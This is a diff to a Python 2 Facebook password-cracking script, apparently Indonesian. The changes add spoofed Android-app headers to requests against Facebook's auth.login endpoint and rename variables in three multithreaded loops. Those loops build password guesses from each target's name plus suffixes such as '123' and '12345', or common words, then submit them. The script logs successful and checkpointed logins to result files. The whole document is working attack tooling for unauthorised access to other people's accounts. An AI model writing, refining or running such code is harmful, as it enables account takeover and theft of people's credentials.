@@ -16,7 +16,6 @@ except ImportError:
     print '\n [×] Modul bs4 belum terinstall!\n'
     os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
 import requests, bs4, sys, os, subprocess, random, time, re, json
-import base64
 from concurrent.futures import ThreadPoolExecutor as YayanGanteng
 from datetime import datetime
 from time import sleep
@@ -673,7 +672,7 @@ class __crack__:
             except: pass
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             api = 'https://b-api.facebook.com/method/auth.login'
-            response = requests.get(api, params=params)
+            response = requests.get(api, params=params, headers = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'})
             if re.search('(EAAA)\\w+', response.text):
                 print '\r  %s* --> %s|%s      %s' % (H,user,pw,N)
                 wrt = ' [✓] %s|%s' % (user,pw)
@@ -757,39 +756,39 @@ class __crack__:
             print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
             print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
             with YayanGanteng(max_workers=30) as (__yayanXD__):
-                for YNTKTS in self.id: # Yo Ndak Tau Kok Tanya Saia
+                for ajg in self.id:
                     try:
-                        bb = YNTKTS.split('<=>')
-                        cy = bb[1].split(' ')
-                        if len(cy) == 1:
-                            bacotBrotherhood = [
-                            	cy[0]+'123', cy[0]+'1234',
-                            	cy[0]+'12345',
+                        bb = ajg.split('<=>')
+                        obj = bb[1].split(' ')
+                        if len(obj) == 1:
+                            listpass = [
+                            	obj[0]+'123', obj[0]+'1234',
+                            	obj[0]+'12345',
                             ]
-                        elif len(cy) == 2:
-                        	bacotBrotherhood = [
-                        		cy[0]+'123', cy[0]+'12345',
-                        		cy[1]+'123', cy[1]+'12345',
+                        elif len(obj) == 2:
+                        	listpass = [
+                        		obj[0]+'123', obj[0]+'12345',
+                        		obj[1]+'123', obj[1]+'12345',
                         	]
-                        elif len(cy) == 3:
-                        	bacotbrotherhood = [
-                        		cy[0]+'123', cy[0]+'12345',
-                        		cy[1]+'123', cy[1]+'12345',
-                        		cy[2]+'123', cy[2]+'12345',
+                        elif len(obj) == 3:
+                        	listpass = [
+                        		obj[0]+'123', obj[0]+'12345',
+                        		obj[1]+'123', obj[1]+'12345',
+                        		obj[2]+'123', obj[2]+'12345',
                         	]
-                        elif len(cy) == 4:
-                        	bacotBrotherhood = [
-                        		cy[0]+'123', cy[0]+'12345',
-                        		cy[1]+'123', cy[1]+'12345',
-                        		cy[2]+'123', cy[2]+'12345',
-                        		cy[3]+'123', cy[3]+'12345',
+                        elif len(obj) == 4:
+                        	listpass = [
+                        		obj[0]+'123', obj[0]+'12345',
+                        		obj[1]+'123', obj[1]+'12345',
+                        		obj[2]+'123', obj[2]+'12345',
+                        		obj[3]+'123', obj[3]+'12345',
                         	]
                         else:
-                        	bacotBrotherhood = [
+                        	listpass = [
                         		'sayang', 'anjing',
                         		'bismillah', '123456'
                         	]
-                        __yayanXD__.submit(self.__api__, bb[0], bacotBrotherhood)
+                        __yayanXD__.submit(self.__api__, bb[0], listpass)
                     except:
                         pass
 
@@ -802,39 +801,39 @@ class __crack__:
             print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
             print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
             with YayanGanteng(max_workers=30) as (__yayanXD__):
-                for YNTKTS in self.id: # Yo Ndak Tau Kok Tanya Saia
+                for ajg in self.id:
                     try:
-                        bb = YNTKTS.split('<=>')
-                        cy = bb[1].split(' ')
-                        if len(cy) == 1:
-                            bacotBrotherhood = [
-                            	cy[0]+'123', cy[0]+'1234',
-                            	cy[0]+'12345',
+                        bb = ajg.split('<=>')
+                        obj = bb[1].split(' ')
+                        if len(obj) == 1:
+                            listpass = [
+                            	obj[0]+'123', obj[0]+'1234',
+                            	obj[0]+'12345',
                             ]
-                        elif len(cy) == 2:
-                        	bacotBrotherhood = [
-                        		cy[0]+'123', cy[0]+'12345',
-                        		cy[1]+'123', cy[1]+'12345',
+                        elif len(obj) == 2:
+                        	listpass = [
+                        		obj[0]+'123', obj[0]+'12345',
+                        		obj[1]+'123', obj[1]+'12345',
                         	]
-                        elif len(cy) == 3:
-                        	bacotbrotherhood = [
-                        		cy[0]+'123', cy[0]+'12345',
-                        		cy[1]+'123', cy[1]+'12345',
-                        		cy[2]+'123', cy[2]+'12345',
+                        elif len(obj) == 3:
+                        	listpass = [
+                        		obj[0]+'123', obj[0]+'12345',
+                        		obj[1]+'123', obj[1]+'12345',
+                        		obj[2]+'123', obj[2]+'12345',
                         	]
-                        elif len(cy) == 4:
-                        	bacotBrotherhood = [
-                        		cy[0]+'123', cy[0]+'12345',
-                        		cy[1]+'123', cy[1]+'12345',
-                        		cy[2]+'123', cy[2]+'12345',
-                        		cy[3]+'123', cy[3]+'12345',
+                        elif len(obj) == 4:
+                        	listpass = [
+                        		obj[0]+'123', obj[0]+'12345',
+                        		obj[1]+'123', obj[1]+'12345',
+                        		obj[2]+'123', obj[2]+'12345',
+                        		obj[3]+'123', obj[3]+'12345',
                         	]
                         else:
-                        	bacotBrotherhood = [
+                        	listpass = [
                         		'sayang', 'anjing',
                         		'bismillah', '123456'
                         	]
-                        __yayanXD__.submit(self.__mbasic__, bb[0], bacotBrotherhood)
+                        __yayanXD__.submit(self.__mbasic__, bb[0], listpass)
                     except:
                         pass
 
@@ -847,39 +846,39 @@ class __crack__:
             print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
             print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
             with YayanGanteng(max_workers=30) as (__yayanXD__):
-                for YNTKTS in self.id: # Yo Ndak Tau Kok Tanya Saia
+                for ajg in self.id:
                     try:
-                        bb = YNTKTS.split('<=>')
-                        cy = bb[1].split(' ')
-                        if len(cy) == 1:
-                            bacotBrotherhood = [
-                            	cy[0]+'123', cy[0]+'1234',
-                            	cy[0]+'12345',
+                        bb = ajg.split('<=>')
+                        obj = bb[1].split(' ')
+                        if len(obj) == 1:
+                            listpass = [
+                            	obj[0]+'123', obj[0]+'1234',
+                            	obj[0]+'12345',
                             ]
-                        elif len(cy) == 2:
-                        	bacotBrotherhood = [
-                        		cy[0]+'123', cy[0]+'12345',
-                        		cy[1]+'123', cy[1]+'12345',
+                        elif len(obj) == 2:
+                        	listpass = [
+                        		obj[0]+'123', obj[0]+'12345',
+                        		obj[1]+'123', obj[1]+'12345',
                         	]
-                        elif len(cy) == 3:
-                        	bacotbrotherhood = [
-                        		cy[0]+'123', cy[0]+'12345',
-                        		cy[1]+'123', cy[1]+'12345',
-                        		cy[2]+'123', cy[2]+'12345',
+                        elif len(obj) == 3:
+                        	listpass = [
+                        		obj[0]+'123', obj[0]+'12345',
+                        		obj[1]+'123', obj[1]+'12345',
+                        		obj[2]+'123', obj[2]+'12345',
                         	]
-                        elif len(cy) == 4:
-                        	bacotBrotherhood = [
-                        		cy[0]+'123', cy[0]+'12345',
-                        		cy[1]+'123', cy[1]+'12345',
-                        		cy[2]+'123', cy[2]+'12345',
-                        		cy[3]+'123', cy[3]+'12345',
+                        elif len(obj) == 4:
+                        	listpass = [
+                        		obj[0]+'123', obj[0]+'12345',
+                        		obj[1]+'123', obj[1]+'12345',
+                        		obj[2]+'123', obj[2]+'12345',
+                        		obj[3]+'123', obj[3]+'12345',
                         	]
                         else:
-                        	bacotBrotherhood = [
+                        	listpass = [
                         		'sayang', 'anjing',
                         		'bismillah', '123456'
                         	]
-                        __yayanXD__.submit(self.__mfb__, bb[0], bacotBrotherhood)
+                        __yayanXD__.submit(self.__mfb__, bb[0], listpass)
                     except:
                         pass
 
